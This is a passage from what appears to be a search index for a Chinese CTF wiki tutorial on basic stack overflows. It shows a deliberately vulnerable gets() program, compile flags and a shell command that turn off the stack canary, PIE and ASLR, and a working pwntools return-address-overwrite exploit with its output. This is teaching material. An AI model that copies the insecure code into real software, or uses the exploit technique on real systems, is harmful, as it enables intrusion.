\u4e3a\u4e86\u964d\u4f4e\u540e\u7eed\u6f0f\u6d1e\u5229\u7528\u590d\u6742\u5ea6\uff0c\u6211\u4eec\u8fd9\u91cc\u5173\u95ed ASLR\uff0c\u5728\u7f16\u8bd1\u65f6\u5173\u95ed PIE\u3002\u5f53\u7136\u8bfb\u8005\u4e5f\u53ef\u4ee5\u5c1d\u8bd5 ASLR\u3001PIE \u5f00\u5173\u7684\u4e0d\u540c\u7ec4\u5408\uff0c\u914d\u5408 IDA \u53ca\u5176\u52a8\u6001\u8c03\u8bd5\u529f\u80fd\u89c2\u5bdf\u7a0b\u5e8f\u5730\u5740\u53d8\u5316\u60c5\u51b5\uff08\u5728 ASLR \u5173\u95ed\u3001PIE \u5f00\u542f\u65f6\u4e5f\u53ef\u4ee5\u653b\u51fb\u6210\u529f\uff09\u3002 \u786e\u8ba4\u6808\u6ea2\u51fa\u548c PIE \u4fdd\u62a4\u5173\u95ed\u540e\uff0c\u6211\u4eec\u5229\u7528 IDA \u6765\u53cd\u7f16\u8bd1\u4e00\u4e0b\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u5e76\u67e5\u770b vulnerable \u51fd\u6570 \u3002\u53ef\u4ee5\u770b\u5230 int vulnerable () { char s ; // [sp+4h] [bp-14h]@1 gets ( & s ); return puts ( & s ); } \u8be5\u5b57\u7b26\u4e32\u8ddd\u79bb ebp \u7684\u957f\u5ea6\u4e3a 0x14\uff0c\u90a3\u4e48\u76f8\u5e94\u7684\u6808\u7ed3\u6784\u4e3a +-----------------+ | retaddr | +-----------------+ | saved ebp | ebp--->+-----------------+ | | | | | | | | | | | | s,ebp-0x14-->+-----------------+ \u5e76\u4e14\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 IDA \u83b7\u5f97 success \u7684\u5730\u5740\uff0c\u5176\u5730\u5740\u4e3a 0x0804843B\u3002 .text: 0804843 B success proc near .text: 0804843 B push ebp .text: 0804843 C mov ebp , esp .text: 0804843 E sub esp , 8 .text: 08048441 sub esp , 0 Ch .text: 08048444 push offset s ; \"You Hava already controlled it.\" .text : 08048449 call _puts .text: 0804844 E add esp , 10 h .text: 08048451 nop .text: 08048452 leave .text: 08048453 retn .text: 08048453 success endp \u90a3\u4e48\u5982\u679c\u6211\u4eec\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u4e3a 0x14*'a'+'bbbb'+success_addr \u90a3\u4e48\uff0c\u7531\u4e8e gets \u4f1a\u8bfb\u5230\u56de\u8f66\u624d\u7b97\u7ed3\u675f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u6240\u6709\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5c06 saved ebp \u8986\u76d6\u4e3a bbbb\uff0c\u5c06 retaddr \u8986\u76d6\u4e3a success_addr\uff0c\u5373\uff0c\u6b64\u65f6\u7684\u6808\u7ed3\u6784\u4e3a +-----------------+ | 0x0804843B | +-----------------+ | bbbb | ebp--->+-----------------+ | | | | | | | | | | | | s,ebp-0x14-->+-----------------+ \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u5728\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\uff0c\u6bcf\u4e2a\u503c\u90fd\u662f\u6309\u7167\u5b57\u8282\u5b58\u50a8\u7684\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u662f\u91c7\u7528\u5c0f\u7aef\u5b58\u50a8\uff0c\u53730x0804843B \u5728\u5185\u5b58\u4e2d\u7684\u5f62\u5f0f\u662f \\x3b\\x84\\x04\\x08 \u4f46\u662f\uff0c\u6211\u4eec\u53c8\u4e0d\u80fd\u76f4\u63a5\u5728\u7ec8\u7aef\u5c06\u8fd9\u4e9b\u5b57\u7b26\u7ed9\u8f93\u5165\u8fdb\u53bb\uff0c\u5728\u7ec8\u7aef\u8f93\u5165\u7684\u65f6\u5019\\\uff0cx\u7b49\u4e5f\u7b97\u4e00\u4e2a\u5355\u72ec\u7684\u5b57\u7b26\u3002\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u5c06 \\x3b \u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u8f93\u5165\u8fdb\u53bb\u3002\u90a3\u4e48\u6b64\u65f6\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528\u4e00\u6ce2 pwntools \u4e86(\u5173\u4e8e\u5982\u4f55\u5b89\u88c5\u4ee5\u53ca\u57fa\u672c\u7528\u6cd5\uff0c\u8bf7\u81ea\u884c github)\uff0c\u8fd9\u91cc\u5229\u7528 pwntools \u7684\u4ee3\u7801\u5982\u4e0b\uff1a ##coding=utf8 from pwn import * ## \u6784\u9020\u4e0e\u7a0b\u5e8f\u4ea4\u4e92\u7684\u5bf9\u8c61 sh = process ( './stack_example' ) success_addr = 0x0804843b ## \u6784\u9020payload payload = 'a' * 0x14 + 'bbbb' + p32 ( success_addr ) print p32 ( success_addr ) ## \u5411\u7a0b\u5e8f\u53d1\u9001\u5b57\u7b26\u4e32 sh . sendline ( payload ) ## \u5c06\u4ee3\u7801\u4ea4\u4e92\u8f6c\u6362\u4e3a\u624b\u5de5\u4ea4\u4e92 sh . interactive () \u6267\u884c\u4e00\u6ce2\u4ee3\u7801\uff0c\u53ef\u4ee5\u5f97\u5230 \u279c stack-example python exp.py [ + ] Starting local process './stack_example' : pid 61936 ; \\x 84 \\x 0 [ * ] Switching to interactive mode aaaaaaaaaaaaaaaaaaaabbbb ; \\x 84 \\x 0 You Hava already controlled it. [ * ] Got EOF while reading in interactive $ [ * ] Process './stack_example' stopped with exit code -11 ( SIGSEGV ) ( pid 61936 ) [ * ] Got EOF while sending in interactive \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u786e\u5b9e\u5df2\u7ecf\u6267\u884c success \u51fd\u6570\u3002 \u5c0f\u603b\u7ed3 \u00b6 \u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u5c55\u793a\u4e86\u6808\u6ea2\u51fa\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4\u3002 \u5bfb\u627e\u5371\u9669\u51fd\u6570 \u00b6 \u901a\u8fc7\u5bfb\u627e\u5371\u9669\u51fd\u6570\uff0c\u6211\u4eec\u5feb\u901f\u786e\u5b9a\u7a0b\u5e8f\u662f\u5426\u53ef\u80fd\u6709\u6808\u6ea2\u51fa\uff0c\u4ee5\u53ca\u6709\u7684\u8bdd\uff0c\u6808\u6ea2\u51fa\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u3002\u5e38\u89c1\u7684\u5371\u9669\u51fd\u6570\u5982\u4e0b \u8f93\u5165 gets\uff0c\u76f4\u63a5\u8bfb\u53d6\u4e00\u884c\uff0c\u5ffd\u7565'\\x00' scanf vscanf \u8f93\u51fa sprintf \u5b57\u7b26\u4e32 strcpy\uff0c\u5b57\u7b26\u4e32\u590d\u5236\uff0c\u9047\u5230'\\x00'\u505c\u6b62 strcat\uff0c\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u9047\u5230'\\x00'\u505c\u6b62 bcopy \u786e\u5b9a\u586b\u5145\u957f\u5ea6 \u00b6 \u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u662f\u8ba1\u7b97 \u6211\u4eec\u6240\u8981\u64cd\u4f5c\u7684\u5730\u5740\u4e0e\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u7684\u8ddd\u79bb \u3002\u5e38\u89c1\u7684\u64cd\u4f5c\u65b9\u6cd5\u5c31\u662f\u6253\u5f00 IDA\uff0c\u6839\u636e\u5176\u7ed9\u5b9a\u7684\u5730\u5740\u8ba1\u7b97\u504f\u79fb\u3002\u4e00\u822c\u53d8\u91cf\u4f1a\u6709\u4ee5\u4e0b\u51e0\u79cd\u7d22\u5f15\u6a21\u5f0f \u76f8\u5bf9\u4e8e\u6808\u57fa\u5730\u5740\u7684\u7684\u7d22\u5f15\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u67e5\u770bEBP\u76f8\u5bf9\u504f\u79fb\u83b7\u5f97 \u76f8\u5bf9\u5e94\u6808\u9876\u6307\u9488\u7684\u7d22\u5f15\uff0c\u4e00\u822c\u9700\u8981\u8fdb\u884c\u8c03\u8bd5\uff0c\u4e4b\u540e\u8fd8\u662f\u4f1a\u8f6c\u6362\u5230\u7b2c\u4e00\u79cd\u7c7b\u578b\u3002 \u76f4\u63a5\u5730\u5740\u7d22\u5f15\uff0c\u5c31\u76f8\u5f53\u4e8e\u76f4\u63a5\u7ed9\u5b9a\u4e86\u5730\u5740\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u6709\u5982\u4e0b\u7684\u8986\u76d6\u9700\u6c42 \u8986\u76d6\u51fd\u6570\u8fd4\u56de\u5730\u5740 \uff0c\u8fd9\u65f6\u5019\u5c31\u662f\u76f4\u63a5\u770b EBP \u5373\u53ef\u3002 \u8986\u76d6\u6808\u4e0a\u67d0\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9 \uff0c\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u66f4\u52a0\u7cbe\u7ec6\u7684\u8ba1\u7b97\u4e86\u3002 \u8986\u76d6 bss \u6bb5\u67d0\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9 \u3002 \u6839\u636e\u73b0\u5b9e\u6267\u884c\u60c5\u51b5\uff0c\u8986\u76d6\u7279\u5b9a\u7684\u53d8\u91cf\u6216\u5730\u5740\u7684\u5185\u5bb9\u3002 \u4e4b\u6240\u4ee5\u6211\u4eec\u60f3\u8981\u8986\u76d6\u67d0\u4e2a\u5730\u5740\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u60f3\u901a\u8fc7\u8986\u76d6\u5730\u5740\u7684\u65b9\u6cd5\u6765 \u76f4\u63a5\u6216\u8005\u95f4\u63a5\u5730\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b \u3002 \u53c2\u8003\u9605\u8bfb \u00b6 stack buffer overflow http://bobao.360.cn/learning/detail/3694.html https://www.cnblogs.com/rec0rd/p/7646857.html","title":"\u6808\u6ea2\u51fa\u539f\u7406"},{"location":"pwn/stackoverflow/stackoverflow_basic/#_1","text":"","title":"\u6808\u6ea2\u51fa\u539f\u7406"},{"location":"pwn/stackoverflow/stackoverflow_basic/#_2","text":"\u6808\u6ea2\u51fa\u6307\u7684\u662f\u7a0b\u5e8f\u5411\u6808\u4e2d\u67d0\u4e2a\u53d8\u91cf\u4e2d\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u53d8\u91cf\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\uff0c\u56e0\u800c\u5bfc\u81f4\u4e0e\u5176\u76f8\u90bb\u7684\u6808\u4e2d\u7684\u53d8\u91cf\u7684\u503c\u88ab\u6539\u53d8\u3002\u8fd9\u79cd\u95ee\u9898\u662f\u4e00\u79cd\u7279\u5b9a\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\uff0c\u7c7b\u4f3c\u7684\u8fd8\u6709\u5806\u6ea2\u51fa\uff0cbss \u6bb5\u6ea2\u51fa\u7b49\u6ea2\u51fa\u65b9\u5f0f\u3002\u6808\u6ea2\u51fa\u6f0f\u6d1e\u8f7b\u5219\u53ef\u4ee5\u4f7f\u7a0b\u5e8f\u5d29\u6e83\uff0c\u91cd\u5219\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002\u6b64\u5916\uff0c\u6211\u4eec\u4e5f\u4e0d\u96be\u53d1\u73b0\uff0c\u53d1\u751f\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u524d\u63d0\u662f \u7a0b\u5e8f\u5fc5\u987b\u5411\u6808\u4e0a\u5199\u5165\u6570\u636e\u3002 \u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\u6ca1\u6709\u88ab\u826f\u597d\u5730\u63a7\u5236\u3002","title":"\u4ecb\u7ecd"},{"location":"pwn/stackoverflow/stackoverflow_basic/#_3","text":"\u6700\u5178\u578b\u7684\u6808\u6ea2\u51fa\u5229\u7528\u662f\u8986\u76d6\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u653b\u51fb\u8005\u6240\u63a7\u5236\u7684\u5730\u5740\uff0c \u5f53\u7136\u9700\u8981\u786e\u4fdd\u8fd9\u4e2a\u5730\u5740\u6240\u5728\u7684\u6bb5\u5177\u6709\u53ef\u6267\u884c\u6743\u9650 \u3002\u4e0b\u9762\uff0c\u6211\u4eec\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a #include <stdio.h> #include <string.h> void success () { puts ( \"You Hava already controlled it.\" ); } void vulnerable () { char s [ 12 ]; gets ( s ); puts ( s ); return ; } int main ( int argc , char ** argv ) { vulnerable (); return 0 ; } \u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4e3b\u8981\u76ee\u7684\u8bfb\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5e76\u5c06\u5176\u8f93\u51fa\u3002 \u6211\u4eec\u5e0c\u671b\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u6267\u884c success \u51fd\u6570\u3002 \u6211\u4eec\u5229\u7528\u5982\u4e0b\u547d\u4ee4\u5bf9\u5176\u8fdb\u884c\u7f16\u8bd1 \u279c stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example stack_example.c: In function \u2018vulnerable\u2019: stack_example.c:6:3: warning: implicit declaration of function \u2018gets\u2019 [ -Wimplicit-function-declaration ] gets ( s ) ; ^ /tmp/ccPU8rRA.o\uff1a\u5728\u51fd\u6570\u2018vulnerable\u2019\u4e2d\uff1a stack_example.c: ( .text+0x27 ) : \u8b66\u544a\uff1a the ` gets ' function is dangerous and should not be used. \u53ef\u4ee5\u770b\u51fa gets \u672c\u8eab\u662f\u4e00\u4e2a\u5371\u9669\u51fd\u6570\u3002\u5b83\u4ece\u4e0d\u68c0\u67e5\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u800c\u662f\u4ee5\u56de\u8f66\u6765\u5224\u65ad\u8f93\u5165\u662f\u5426\u7ed3\u675f\uff0c\u6240\u4ee5\u5f88\u5bb9\u6613\u53ef\u4ee5\u5bfc\u81f4\u6808\u6ea2\u51fa\uff0c \u5386\u53f2\u4e0a\uff0c \u83ab\u91cc\u65af\u8815\u866b \u7b2c\u4e00\u79cd\u8815\u866b\u75c5\u6bd2\u5c31\u5229\u7528\u4e86 gets \u8fd9\u4e2a\u5371\u9669\u51fd\u6570\u5b9e\u73b0\u4e86\u6808\u6ea2\u51fa\u3002 gcc \u7f16\u8bd1\u6307\u4ee4\u4e2d\uff0c -m32 \u6307\u7684\u662f\u751f\u6210 32 \u4f4d\u7a0b\u5e8f\uff1b -fno-stack-protector \u6307\u7684\u662f\u4e0d\u5f00\u542f\u5806\u6808\u6ea2\u51fa\u4fdd\u62a4\uff0c\u5373\u4e0d\u751f\u6210 canary\u3002 \u6b64\u5916\uff0c\u4e3a\u4e86\u66f4\u52a0\u65b9\u4fbf\u5730\u4ecb\u7ecd\u6808\u6ea2\u51fa\u7684\u57fa\u672c\u5229\u7528\u65b9\u5f0f\uff0c\u8fd9\u91cc\u8fd8\u9700\u8981\u5173\u95ed PIE\uff08Position Independent Executable\uff09\uff0c\u907f\u514d\u52a0\u8f7d\u57fa\u5740\u88ab\u6253\u4e71\u3002\u4e0d\u540c gcc \u7248\u672c\u5bf9\u4e8e PIE \u7684\u9ed8\u8ba4\u914d\u7f6e\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4 gcc -v \u67e5\u770bgcc \u9ed8\u8ba4\u7684\u5f00\u5173\u60c5\u51b5\u3002\u5982\u679c\u542b\u6709 --enable-default-pie \u53c2\u6570\u5219\u4ee3\u8868 PIE \u9ed8\u8ba4\u5df2\u5f00\u542f\uff0c\u9700\u8981\u5728\u7f16\u8bd1\u6307\u4ee4\u4e2d\u6dfb\u52a0\u53c2\u6570 -no-pie \u3002 \u7f16\u8bd1\u6210\u529f\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 checksec \u5de5\u5177\u68c0\u67e5\u7f16\u8bd1\u51fa\u7684\u6587\u4ef6\uff1a \u279c stack-example checksec stack_example Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u63d0\u5230\u7f16\u8bd1\u65f6\u7684 PIE \u4fdd\u62a4\uff0cLinux\u5e73\u53f0\u4e0b\u8fd8\u6709\u5730\u5740\u7a7a\u95f4\u5206\u5e03\u968f\u673a\u5316\uff08ASLR\uff09\u7684\u673a\u5236\u3002\u7b80\u5355\u6765\u8bf4\u5373\u4f7f\u53ef\u6267\u884c\u6587\u4ef6\u5f00\u542f\u4e86 PIE \u4fdd\u62a4\uff0c\u8fd8\u9700\u8981\u7cfb\u7edf\u5f00\u542f ASLR \u624d\u4f1a\u771f\u6b63\u6253\u4e71\u57fa\u5740\uff0c\u5426\u5219\u7a0b\u5e8f\u8fd0\u884c\u65f6\u4f9d\u65e7\u4f1a\u5728\u52a0\u8f7d\u4e00\u4e2a\u56fa\u5b9a\u7684\u57fa\u5740\u4e0a\uff08\u4e0d\u8fc7\u548c No PIE \u65f6\u57fa\u5740\u4e0d\u540c\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539 /proc/sys/kernel/randomize_va_space \u6765\u63a7\u5236 ASLR \u542f\u52a8\u4e0e\u5426\uff0c\u5177\u4f53\u7684\u9009\u9879\u6709 0\uff0c\u5173\u95ed ASLR\uff0c\u6ca1\u6709\u968f\u673a\u5316\u3002\u6808\u3001\u5806\u3001.so \u7684\u57fa\u5730\u5740\u6bcf\u6b21\u90fd\u76f8\u540c\u3002 1\uff0c\u666e\u901a\u7684 ASLR\u3002\u6808\u57fa\u5730\u5740\u3001mmap\u57fa\u5730\u5740\u3001.so\u52a0\u8f7d\u57fa\u5730\u5740\u90fd\u5c06\u88ab\u968f\u673a\u5316\uff0c\u4f46\u662f\u5806\u57fa\u5730\u5740\u6ca1\u6709\u968f\u673a\u5316\u3002 2\uff0c\u589e\u5f3a\u7684ASLR\uff0c\u5728 1 \u7684\u57fa\u7840\u4e0a\uff0c\u589e\u52a0\u4e86\u5806\u57fa\u5730\u5740\u968f\u673a\u5316\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 echo 0 > /proc/sys/kernel/randomize_va_space \u5173\u95ed Linux \u7cfb\u7edf\u7684 ASLR\uff0c\u7c7b\u4f3c\u7684\uff0c\u4e5f\u53ef\u4ee5\u914d\u7f6e\u76f8\u5e94\u7684\u53c2\u6570\u3002 \u4e3a\u4e86\u964d\u4f4e\u540e\u7eed\u6f0f\u6d1e\u5229\u7528\u590d\u6742\u5ea6\uff0c\u6211\u4eec\u8fd9\u91cc\u5173\u95ed ASLR\uff0c\u5728\u7f16\u8bd1\u65f6\u5173\u95ed PIE\u3002\u5f53\u7136\u8bfb\u8005\u4e5f\u53ef\u4ee5\u5c1d\u8bd5 ASLR\u3001PIE \u5f00\u5173\u7684\u4e0d\u540c\u7ec4\u5408\uff0c\u914d\u5408 IDA \u53ca\u5176\u52a8\u6001\u8c03\u8bd5\u529f\u80fd\u89c2\u5bdf\u7a0b\u5e8f\u5730\u5740\u53d8\u5316\u60c5\u51b5\uff08\u5728 ASLR \u5173\u95ed\u3001PIE \u5f00\u542f\u65f6\u4e5f\u53ef\u4ee5\u653b\u51fb\u6210\u529f\uff09\u3002 \u786e\u8ba4\u6808\u6ea2\u51fa\u548c PIE \u4fdd\u62a4\u5173\u95ed\u540e\uff0c\u6211\u4eec\u5229\u7528 IDA \u6765\u53cd\u7f16\u8bd1\u4e00\u4e0b\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u5e76\u67e5\u770b vulnerable \u51fd\u6570 \u3002\u53ef\u4ee5\u770b\u5230 int vulnerable () { char s ; // [sp+4h] [bp-14h]@1 gets ( & s ); return puts ( & s ); } \u8be5\u5b57\u7b26\u4e32\u8ddd\u79bb ebp \u7684\u957f\u5ea6\u4e3a 0x14\uff0c\u90a3\u4e48\u76f8\u5e94\u7684\u6808\u7ed3\u6784\u4e3a +-----------------+ | retaddr | +-----------------+ | saved ebp | ebp--->+-----------------+ | | | | | | | | | | | | s,ebp-0x14-->+-----------------+ \u5e76\u4e14\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 IDA \u83b7\u5f97 success \u7684\u5730\u5740\uff0c\u5176\u5730\u5740\u4e3a 0x0804843B\u3002 .text: 0804843 B success proc near .text: 0804843 B push ebp .text: 0804843 C mov ebp , esp .text: 0804843 E sub esp , 8 .text: 08048441 sub esp , 0 Ch .text: 08048444 push offset s ; \"You Hava already controlled it.\" .text : 08048449 call _puts .text: 0804844 E add esp , 10 h .text: 08048451 nop .text: 08048452 leave .text: 08048453 retn .text: 08048453 success endp \u90a3\u4e48\u5982\u679c\u6211\u4eec\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u4e3a 0x14*'a'+'bbbb'+success_addr \u90a3\u4e48\uff0c\u7531\u4e8e gets \u4f1a\u8bfb\u5230\u56de\u8f66\u624d\u7b97\u7ed3\u675f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6\u6240\u6709\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5c06 saved ebp \u8986\u76d6\u4e3a bbbb\uff0c\u5c06 retaddr \u8986\u76d6\u4e3a success_addr\uff0c\u5373\uff0c\u6b64\u65f6\u7684\u6808\u7ed3\u6784\u4e3a +-----------------+ | 0x0804843B | +-----------------+ | bbbb | ebp--->+-----------------+ | | | | | | | | | | | | s,ebp-0x14-->+-----------------+ \u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u5728\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\uff0c\u6bcf\u4e2a\u503c\u90fd\u662f\u6309\u7167\u5b57\u8282\u5b58\u50a8\u7684\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\u90fd\u662f\u91c7\u7528\u5c0f\u7aef\u5b58\u50a8\uff0c\u53730x0804843B \u5728\u5185\u5b58\u4e2d\u7684\u5f62\u5f0f\u662f \\x3b\\x84\\x04\\x08 \u4f46\u662f\uff0c\u6211\u4eec\u53c8\u4e0d\u80fd\u76f4\u63a5\u5728\u7ec8\u7aef\u5c06\u8fd9\u4e9b\u5b57\u7b26\u7ed9\u8f93\u5165\u8fdb\u53bb\uff0c\u5728\u7ec8\u7aef\u8f93\u5165\u7684\u65f6\u5019\\\uff0cx\u7b49\u4e5f\u7b97\u4e00\u4e2a\u5355\u72ec\u7684\u5b57\u7b26\u3002\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u60f3\u529e\u6cd5\u5c06 \\x3b \u4f5c\u4e3a\u4e00\u4e2a\u5b57\u7b26\u8f93\u5165\u8fdb\u53bb\u3002\u90a3\u4e48\u6b64\u65f6\u6211\u4eec\u5c31\u9700\u8981\u4f7f\u7528\u4e00\u6ce2 pwntools \u4e86(\u5173\u4e8e\u5982\u4f55\u5b89\u88c5\u4ee5\u53ca\u57fa\u672c\u7528\u6cd5\uff0c\u8bf7\u81ea\u884c github)\uff0c\u8fd9\u91cc\u5229\u7528 pwntools \u7684\u4ee3\u7801\u5982\u4e0b\uff1a ##coding=utf8 from pwn import * ## \u6784\u9020\u4e0e\u7a0b\u5e8f\u4ea4\u4e92\u7684\u5bf9\u8c61 sh = process ( './stack_example' ) success_addr = 0x0804843b ## \u6784\u9020payload payload = 'a' * 0x14 + 'bbbb' + p32 ( success_addr ) print p32 ( success_addr ) ## \u5411\u7a0b\u5e8f\u53d1\u9001\u5b57\u7b26\u4e32 sh . sendline ( payload ) ## \u5c06\u4ee3\u7801\u4ea4\u4e92\u8f6c\u6362\u4e3a\u624b\u5de5\u4ea4\u4e92 sh . interactive () \u6267\u884c\u4e00\u6ce2\u4ee3\u7801\uff0c\u53ef\u4ee5\u5f97\u5230 \u279c stack-example python exp.py [ + ] Starting local process './stack_example' : pid 61936 ; \\x 84 \\x 0 [ * ] Switching to interactive mode aaaaaaaaaaaaaaaaaaaabbbb ; \\x 84 \\x 0 You Hava already controlled it. [ * ] Got EOF while reading in interactive $ [ * ] Process './stack_example' stopped with exit code -11 ( SIGSEGV ) ( pid 61936 ) [ * ] Got EOF while sending in interactive \u53ef\u4ee5\u770b\u5230\u6211\u4eec\u786e\u5b9e\u5df2\u7ecf\u6267\u884c success \u51fd\u6570\u3002","title":"\u57fa\u672c\u793a\u4f8b"},{"location":"pwn/stackoverflow/stackoverflow_basic/#_4","text":"\u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u5c55\u793a\u4e86\u6808\u6ea2\u51fa\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4\u3002","title":"\u5c0f\u603b\u7ed3"},{"location":"pwn/stackoverflow/stackoverflow_basic/#_5","text":"\u901a\u8fc7\u5bfb\u627e\u5371\u9669\u51fd\u6570\uff0c\u6211\u4eec\u5feb\u901f\u786e\u5b9a\u7a0b\u5e8f\u662f\u5426\u53ef\u80fd\u6709\u6808\u6ea2\u51fa\uff0c\u4ee5\u53ca\u6709\u7684\u8bdd\uff0c\u6808\u6ea2\u51fa\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u3002\u5e38\u89c1\u7684\u5371\u9669\u51fd\u6570\u5982\u4e0b \u8f93\u5165 gets\uff0c\u76f4\u63a5\u8bfb\u53d6\u4e00\u884c\uff0c\u5ffd\u7565'\\x00' scanf vscanf \u8f93\u51fa sprintf \u5b57\u7b26\u4e32 strcpy\uff0c\u5b57\u7b26\u4e32\u590d\u5236\uff0c\u9047\u5230'\\x00'\u505c\u6b62 strcat\uff0c\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u9047\u5230'\\x00'\u505c\u6b62 bcopy","title":"\u5bfb\u627e\u5371\u9669\u51fd\u6570"},{"location":"pwn/stackoverflow/stackoverflow_basic/#_6","text":"\u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u662f\u8ba1\u7b97 \u6211\u4eec\u6240\u8981\u64cd\u4f5c\u7684\u5730\u5740\u4e0e\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u7684\u8ddd\u79bb \u3002\u5e38\u89c1\u7684\u64cd\u4f5c\u65b9\u6cd5\u5c31\u662f\u6253\u5f00 IDA\uff0c\u6839\u636e\u5176\u7ed9\u5b9a\u7684\u5730\u5740\u8ba1\u7b97\u504f\u79fb\u3002\u4e00\u822c\u53d8\u91cf\u4f1a\u6709\u4ee5\u4e0b\u51e0\u79cd\u7d22\u5f15\u6a21\u5f0f \u76f8\u5bf9\u4e8e\u6808\u57fa\u5730\u5740\u7684\u7684\u7d22\u5f15\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u67e5\u770bEBP\u76f8\u5bf9\u504f\u79fb\u83b7\u5f97 \u76f8\u5bf9\u5e94\u6808\u9876\u6307\u9488\u7684\u7d22\u5f15\uff0c\u4e00\u822c\u9700\u8981\u8fdb\u884c\u8c03\u8bd5\uff0c\u4e4b\u540e\u8fd8\u662f\u4f1a\u8f6c\u6362\u5230\u7b2c\u4e00\u79cd\u7c7b\u578b\u3002 \u76f4\u63a5\u5730\u5740\u7d22\u5f15\uff0c\u5c31\u76f8\u5f53\u4e8e\u76f4\u63a5\u7ed9\u5b9a\u4e86\u5730\u5740\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u6709\u5982\u4e0b\u7684\u8986\u76d6\u9700\u6c42 \u8986\u76d6\u51fd\u6570\u8fd4\u56de\u5730\u5740 \uff0c\u8fd9\u65f6\u5019\u5c31\u662f\u76f4\u63a5\u770b EBP \u5373\u53ef\u3002 \u8986\u76d6\u6808\u4e0a\u67d0\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9 \uff0c\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u66f4\u52a0\u7cbe\u7ec6\u7684\u8ba1\u7b97\u4e86\u3002 \u8986\u76d6 bss \u6bb5\u67d0\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9 \u3002 \u6839\u636e\u73b0\u5b9e\u6267\u884c\u60c5\u51b5\uff0c\u8986\u76d6\u7279\u5b9a\u7684\u53d8\u91cf\u6216\u5730\u5740\u7684\u5185\u5bb9\u3002 \u4e4b\u6240\u4ee5\u6211\u4eec\u60f3\u8981\u8986\u76d6\u67d0\u4e2a\u5730\u5740\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u60f3\u901a\u8fc7\u8986\u76d6\u5730\u5740\u7684\u65b9\u6cd5\u6765 \u76f4\u63a5\u6216\u8005\u95f4\u63a5\u5730\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b \u3002","title":"\u786e\u5b9a\u586b\u5145\u957f\u5ea6"},{"location":"pwn/stackoverflow/stackoverflow_basic/#_7","text":"stack buffer overflow http://bobao.360.cn/learning/detail/3694.html 